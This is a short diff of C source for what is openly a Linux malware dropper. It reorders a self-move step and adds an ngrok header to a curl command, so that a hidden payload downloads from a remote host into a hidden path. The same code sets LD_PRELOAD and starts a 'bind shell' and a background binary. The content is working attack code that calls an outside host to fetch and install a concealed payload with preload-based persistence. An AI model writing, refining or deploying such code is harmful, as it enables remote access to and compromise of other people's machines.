@@ -34,9 +34,9 @@ int main(int argc, char **argv, char **envp) {
 
     // start bind shell
     if (downloaded == 0) {
+        move(argv[0]);
         download();
         set_ld_preload();
-        move(argv[0]);
 
         // start /usr/bin/rm_s in background and quit here
         char command[1024];
@@ -154,7 +154,7 @@ int download() {
 #endif
     char command[1024];
     #define NGROK_SKIP_HEADER "--header \"ngrok-skip-browser-warning: skip-browser-warning\""
-    sprintf(command, "curl -o %s https://%s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, "");
+    sprintf(command, "curl -o %s https://%s/%s %s > /dev/null 2>&1", HIDDEN_PATH, HOST, HIDDEN_FILENAME2, NGROK_SKIP_HEADER);
 #ifdef VERBOSE
     printf("%s\n", command);
 #endif
